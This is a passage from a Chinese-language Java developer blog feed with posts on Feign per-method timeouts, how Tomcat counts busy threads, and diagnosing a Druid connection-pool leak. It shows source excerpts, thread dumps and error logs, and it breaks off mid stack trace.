Source)</span><br></pre></td></tr></table></figure><img src="/2020/04/28/feign-method-timeout/image-20200428135018581.png"><p><code>vip</code>没有解析出来，版本改了之后就没有问题了:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">feign-core.version</span>&gt;</span>10.10.1<span class="tag">&lt;/<span class="name">feign-core.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.github.openfeign<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>feign-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;feign-core.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.github.openfeign<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>feign-ribbon<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;feign-core.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>代码里连接超时设置为100mills，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> List&lt;Integer&gt; effectiveMebIds =</span><br><span class="line">           personalMemberRemote.getEffectiveMebIds(<span class="keyword">new</span> Request.Options(<span class="number">100</span>, <span class="number">500</span>), Lists.newArrayList(<span class="number">1</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">1386232841</span>));</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">13:55:21.376 [PollingServerListUpdater-0] DEBUG c.n.l.DynamicServerListLoadBalancer-179  - Setting server list <span class="keyword">for</span> zones: &#123;defaultzone=[192.168.16.211:10020]&#125;</span><br><span class="line">13:55:21.376 [PollingServerListUpdater-0] DEBUG c.n.loadbalancer.BaseLoadBalancer-472  - LoadBalancer [user-center_defaultzone]: clearing server list (SET op)</span><br><span class="line">13:55:21.376 [PollingServerListUpdater-0] DEBUG c.n.loadbalancer.BaseLoadBalancer-488  - LoadBalancer [user-center_defaultzone]:  addServer [192.168.16.211:10020]</span><br><span class="line">13:55:21.600 [main] DEBUG c.n.l.ZoneAwareLoadBalancer-112  - Zone aware logic disabled or there is only one zone</span><br><span class="line">13:55:21.633 [main] DEBUG c.n.loadbalancer.LoadBalancerContext-492  - user-center using LB returned Server: 192.168.16.211:10020 <span class="keyword">for</span> request http:///personalMember/getEffectiveMebIds</span><br><span class="line">13:55:21.741 [main] DEBUG c.n.l.reactive.LoadBalancerCommand-314  - Got error java.net.SocketTimeoutException: connect timed out when executed on server 192.168.16.211:10020</span><br><span class="line">13:55:22.253 [main] DEBUG c.n.l.ZoneAwareLoadBalancer-112  - Zone aware logic disabled or there is only one zone</span><br><span class="line">13:55:22.254 [main] DEBUG c.n.loadbalancer.LoadBalancerContext-492  - user-center using LB returned Server: 192.168.16.211:10020 <span class="keyword">for</span> request http:///personalMember/getEffectiveMebIds</span><br><span class="line">13:55:22.358 [main] DEBUG c.n.l.reactive.LoadBalancerCommand-314  - Got error java.net.SocketTimeoutException: connect timed out when executed on server 192.168.16.211:10020</span><br><span class="line"></span><br><span class="line">feign.RetryableException: connect timed out executing POST http://user-center/personalMember/getEffectiveMebIds</span><br><span class="line"></span><br><span class="line">at feign.FeignException.errorExecuting(FeignException.java:249)</span><br><span class="line">at feign.SynchronousMethodHandler.executeAndDecode(SynchronousMethodHandler.java:129)</span><br><span class="line">at feign.SynchronousMethodHandler.invoke(SynchronousMethodHandler.java:89)</span><br><span class="line">at feign.ReflectiveFeign<span class="variable">$FeignInvocationHandler</span>.invoke(ReflectiveFeign.java:100)</span><br><span class="line">at com.sun.proxy.<span class="variable">$Proxy36</span>.getEffectiveMebIds(Unknown Source)</span><br></pre></td></tr></table></figure><p>直接超时了，说明这个限制生效了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;img src=&quot;/2020/04/28/feign-method-timeout/image-20200428135947174.png&quot;&gt;
&lt;h2 id=&quot;Feign方法级别的超时&quot;&gt;&lt;a href=&quot;#Feign方法级别的超时&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
      <category term="feign" scheme="http://qsli.github.io/categories/feign/"/>
    
    
      <category term="spring-cloud" scheme="http://qsli.github.io/tags/spring-cloud/"/>
    
  </entry>
  
  <entry>
    <title>tomcat busy thread如何统计的</title>
    <link href="http://qsli.github.io/2020/04/27/tomcat-busy-thread/"/>
    <id>http://qsli.github.io/2020/04/27/tomcat-busy-thread/</id>
    <published>2020-04-27T05:59:37.000Z</published>
    <updated>2020-04-27T05:59:37.209Z</updated>
    
    <content type="html"><![CDATA[<h2 id="tomcat-busy-thread"><a href="#tomcat-busy-thread" class="headerlink" title="tomcat busy thread"></a>tomcat busy thread</h2><p>突然好奇tomcat的busy thread怎么统计的，翻了下代码。</p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.apache.tomcat.util.net.AbstractEndpoint#getCurrentThreadsBusy   </span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Return the amount of threads that are in use</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the amount of threads that are in use</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCurrentThreadsBusy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (executor!=<span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (executor <span class="keyword">instanceof</span> ThreadPoolExecutor) &#123;</span><br><span class="line">      <span class="keyword">return</span> ((ThreadPoolExecutor)executor).getActiveCount();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (executor <span class="keyword">instanceof</span> ResizableExecutor) &#123;</span><br><span class="line">      <span class="keyword">return</span> ((ResizableExecutor)executor).getActiveCount();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是在执行任务的线程跟线程的状态没有关系：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// java.util.concurrent.ThreadPoolExecutor#getActiveCount</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the approximate number of threads that are actively</span></span><br><span class="line"><span class="comment">     * executing tasks.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the number of threads</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getActiveCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">  mainLock.lock();</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Worker w : workers)</span><br><span class="line">      <span class="keyword">if</span> (w.isLocked())</span><br><span class="line">        ++n;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    mainLock.unlock();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取"><a href="#获取" class="headerlink" title="获取"></a>获取</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> MBeanServer server = ManagementFactory.getPlatformMBeanServer();</span><br><span class="line">Set&lt;ObjectName&gt; names = server.queryNames(<span class="keyword">new</span> ObjectName(<span class="string">"Catalina:type=ThreadPool,*"</span>), <span class="keyword">null</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">final</span> ObjectName name : names) &#123;</span><br><span class="line">    System.out.println(name);</span><br><span class="line">    <span class="keyword">final</span> Object maxThreads = server.getAttribute(name, <span class="string">"maxThreads"</span>);</span><br><span class="line">    <span class="keyword">final</span> Object currentThreadCount = server.getAttribute(name, <span class="string">"currentThreadCount"</span>);</span><br><span class="line">    <span class="keyword">final</span> Object currentThreadsBusy = server.getAttribute(name, <span class="string">"currentThreadsBusy"</span>);</span><br><span class="line">    System.out.println(<span class="string">"maxThreads = "</span> + maxThreads);</span><br><span class="line">    System.out.println(<span class="string">"currentThreadCount = "</span> + currentThreadCount);</span><br><span class="line">    System.out.println(<span class="string">"currentThreadsBusy = "</span> + currentThreadsBusy);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Catalina:<span class="built_in">type</span>=ThreadPool,name=<span class="string">"ajp-nio-8009"</span></span><br><span class="line">maxThreads = 200</span><br><span class="line">currentThreadCount = 10</span><br><span class="line">currentThreadsBusy = 0</span><br><span class="line">Catalina:<span class="built_in">type</span>=ThreadPool,name=<span class="string">"http-nio-8080"</span></span><br><span class="line">maxThreads = 200</span><br><span class="line">currentThreadCount = 10</span><br><span class="line">currentThreadsBusy = 0</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;tomcat-busy-thread&quot;&gt;&lt;a href=&quot;#tomcat-busy-thread&quot; class=&quot;headerlink&quot; title=&quot;tomcat busy thread&quot;&gt;&lt;/a&gt;tomcat busy thread&lt;/h2&gt;&lt;p&gt;突然好奇to
      
    
    </summary>
    
      <category term="tomcat" scheme="http://qsli.github.io/categories/tomcat/"/>
    
    
      <category term="busy-thread" scheme="http://qsli.github.io/tags/busy-thread/"/>
    
  </entry>
  
  <entry>
    <title>Druid连接泄露记录</title>
    <link href="http://qsli.github.io/2020/04/25/druid-conn-leak/"/>
    <id>http://qsli.github.io/2020/04/25/druid-conn-leak/</id>
    <published>2020-04-25T12:36:21.000Z</published>
    <updated>2020-04-25T12:36:21.334Z</updated>
    
    <content type="html"><![CDATA[<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>当时数据库需要升级配置，已知中间会有闪断，按照之前的经验都是自动重连然后恢复。但是，这次tomcat的连接线程全部变成busy，导致应用不能提供服务。线程栈如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"http-nio-11022-exec-196"</span> <span class="comment">#216701 daemon prio=5 os_prio=0 tid=0x00007fbac4082000 nid=0x3c4a waiting on condition [0x00007fba0fb52000]</span></span><br><span class="line">   java.lang.Thread.State: WAITING (parking)</span><br><span class="line">at sun.misc.Unsafe.park(Native Method)</span><br><span class="line">- parking to <span class="built_in">wait</span> <span class="keyword">for</span>  &lt;0x00007fbb318710f0&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer<span class="variable">$ConditionObject</span>)</span><br><span class="line">at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)</span><br><span class="line">at java.util.concurrent.locks.AbstractQueuedSynchronizer<span class="variable">$ConditionObject</span>.await(AbstractQueuedSynchronizer.java:2039)</span><br><span class="line">at com.alibaba.druid.pool.DruidDataSource.takeLast(DruidDataSource.java:1899)</span><br><span class="line">at com.alibaba.druid.pool.DruidDataSource.getConnectionInternal(DruidDataSource.java:1460)</span><br><span class="line">at com.alibaba.druid.pool.DruidDataSource.getConnectionDirect(DruidDataSource.java:1255)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5007)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.dataSource_getConnection(FilterAdapter.java:2745)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">at com.alibaba.druid.filter.logging.LogFilter.dataSource_getConnection(LogFilter.java:876)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">at com.alibaba.druid.filter.stat.StatFilter.dataSource_getConnection(StatFilter.java:680)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.dataSource_getConnection(FilterAdapter.java:2745)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">at com.alibaba.druid.filter.stat.StatFilter.dataSource_getConnection(StatFilter.java:680)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.dataSource_getConnection(FilterAdapter.java:2745)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">at com.alibaba.druid.pool.DruidDataSource.getConnection(DruidDataSource.java:1233)</span><br><span class="line">at com.alibaba.druid.pool.DruidDataSource.getConnection(DruidDataSource.java:1225)</span><br><span class="line">at com.alibaba.druid.pool.DruidDataSource.getConnection(DruidDataSource.java:90)</span><br><span class="line">at com.atour.db.DynamicDataSource.getConnection(DynamicDataSource.java:140)</span><br><span class="line">at org.springframework.jdbc.datasource.DataSourceUtils.fetchConnection(DataSourceUtils.java:151)</span><br><span class="line">at org.springframework.jdbc.datasource.DataSourceUtils.doGetConnection(DataSourceUtils.java:115)</span><br><span class="line">at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:78)</span><br><span class="line">at org.mybatis.spring.transaction.SpringManagedTransaction.openConnection(SpringManagedTransaction.java:82)</span><br><span class="line">at org.mybatis.spring.transaction.SpringManagedTransaction.getConnection(SpringManagedTransaction.java:68)</span><br><span class="line">at com.atour.migrate.helper.mybatis.interceptor.MyBatisMigrateChainIdKiller.checkDsIgnoreTableStatus(MyBatisMigrateChainIdKiller.java:181)</span><br></pre></td></tr></table></figure><p>查看jstack的输出发现连接线程都卡在了<code>DruidDataSource.java:1899</code>， 代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DruidConnectionHolder <span class="title">takeLast</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException, SQLException </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">while</span> (poolingCount == <span class="number">0</span>) &#123;</span><br><span class="line">               emptySignal(); <span class="comment">// send signal to CreateThread create connection</span></span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span> (failFast &amp;&amp; failContinuous.get()) &#123;</span><br><span class="line">                   <span class="keyword">throw</span> <span class="keyword">new</span> DataSourceNotAvailableException(createError);</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               notEmptyWaitThreadCount++;</span><br><span class="line">               <span class="keyword">if</span> (notEmptyWaitThreadCount &gt; notEmptyWaitThreadPeak) &#123;</span><br><span class="line">                   notEmptyWaitThreadPeak = notEmptyWaitThreadCount;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                 <span class="comment">// DruidDataSource.java:1899 卡在这里</span></span><br><span class="line">                   notEmpty.await(); <span class="comment">// signal by recycle or creator</span></span><br><span class="line">               &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                   notEmptyWaitThreadCount--;</span><br><span class="line">               &#125;</span><br><span class="line">               notEmptyWaitCount++;</span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span> (!enable) &#123;</span><br><span class="line">                   connectErrorCountUpdater.incrementAndGet(<span class="keyword">this</span>);</span><br><span class="line">                   <span class="keyword">throw</span> <span class="keyword">new</span> DataSourceDisableException();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (InterruptedException ie) &#123;</span><br><span class="line">           notEmpty.signal(); <span class="comment">// propagate to non-interrupted thread</span></span><br><span class="line">           notEmptySignalCount++;</span><br><span class="line">           <span class="keyword">throw</span> ie;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       decrementPoolingCount();</span><br><span class="line">       DruidConnectionHolder last = connections[poolingCount];</span><br><span class="line">       connections[poolingCount] = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> last;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>等待在druid的notEmpty队里上，等待有可用的连接。找到对应的创建连接线程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"Druid-ConnectionPool-Create-219971169"</span> <span class="comment">#80 daemon prio=5 os_prio=0 tid=0x00007fbab2fce000 nid=0x67e0 waiting on condition [0x00007fba2b974000]</span></span><br><span class="line">   java.lang.Thread.State: WAITING (parking)</span><br><span class="line">at sun.misc.Unsafe.park(Native Method)</span><br><span class="line">- parking to <span class="built_in">wait</span> <span class="keyword">for</span>  &lt;0x00007fbb31048098&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer<span class="variable">$ConditionObject</span>)</span><br><span class="line">at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)</span><br><span class="line">at java.util.concurrent.locks.AbstractQueuedSynchronizer<span class="variable">$ConditionObject</span>.await(AbstractQueuedSynchronizer.java:2039)</span><br><span class="line">at com.alibaba.druid.pool.DruidDataSource<span class="variable">$CreateConnectionThread</span>.run(DruidDataSource.java:2448)</span><br><span class="line"></span><br><span class="line">   Locked ownable synchronizers:</span><br><span class="line">- None</span><br></pre></td></tr></table></figure><p>对应的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 防止创建超过maxActive数量的连接</span></span><br><span class="line"><span class="keyword">if</span> (activeCount + poolingCount &gt;= maxActive) &#123;</span><br><span class="line">  <span class="comment">// DruidDataSource.java:2448</span></span><br><span class="line">  empty.await();</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>奇怪的是，创建连接的线程在等待empty的条件。问题可能就出在<code>activeCount + poolingCount &gt;= maxActive</code>这个条件上，其他线程都在等待连接，所以<code>poolingCount</code>肯定是0（连接池里没有空闲的连接），那么有问题的肯定是<code>activeCount</code>这里了。</p><p>第一反应是<code>druid</code>的bug，去github的issue上找了好久也没有找到类似的bug，只能再深入的挖掘系统的错误日志，最终还是找到了一些端倪。最初断开连接的时候出错日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">2020-04-09 17:32:29.321 ERROR [pms-provider-prod,cbcb523cffa38a5d,cbcb523cffa38a5d,<span class="literal">false</span>] --- [io-11022-exec-2] c.a.m.h.m.i.MyBatisMigrateChainIdKiller  : migrate.helper.MyBatisMigrateChainIdKillerError处理过程出现错误,</span><br><span class="line"></span><br><span class="line">org.springframework.jdbc.CannotGetJdbcConnectionException: Failed to obtain JDBC Connection; nested exception is com.microsoft.sqlserver.jdbc.SQLServerException: SQL Server 未返回响应。连接已关闭。</span><br><span class="line">at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:81)</span><br><span class="line">at org.mybatis.spring.transaction.SpringManagedTransaction.openConnection(SpringManagedTransaction.java:82)</span><br><span class="line">at org.mybatis.spring.transaction.SpringManagedTransaction.getConnection(SpringManagedTransaction.java:68)</span><br><span class="line">at com.atour.migrate.helper.mybatis.interceptor.MyBatisMigrateChainIdKiller.checkDsIgnoreTableStatus(MyBatisMigrateChainIdKiller.java:181)</span><br><span class="line">...</span><br><span class="line">Caused by: com.microsoft.sqlserver.jdbc.SQLServerException: SQL Server 未返回响应。连接已关闭。</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerConnection.terminate(SQLServerConnection.java:1667)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerConnection.terminate(SQLServerConnection.java:1654)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.TDSReader.readPacket(IOBuffer.java:4844)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.TDSCommand.startResponse(IOBuffer.java:6154)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.TDSCommand.startResponse(IOBuffer.java:6106)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerConnection<span class="variable">$1ConnectionCommand</span>.doExecute(SQLServerConnection.java:1756)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.TDSCommand.execute(IOBuffer.java:5696)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerConnection.executeCommand(SQLServerConnection.java:1715)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerConnection.connectionCommand(SQLServerConnection.java:1761)</span><br><span class="line">at com.microsoft.sqlserver.jdbc.SQLServerConnection.setCatalog(SQLServerConnection.java:2063)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:750)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">at com.alibaba.druid.proxy.jdbc.ConnectionProxyImpl.setCatalog(ConnectionProxyImpl.java:437)</span><br><span class="line">at com.alibaba.druid.pool.DruidPooledConnection.setCatalog(DruidPooledConnection.java:910)</span><br><span class="line">at com.atour.db.DynamicDataSource.getConnection(DynamicDataSource.java:143)</span><br><span class="line">at org.springframework.jdbc.datasource.DataSourceUtils.fetchConnection(DataSourceUtils.java:151)</span><br><span class="line">at 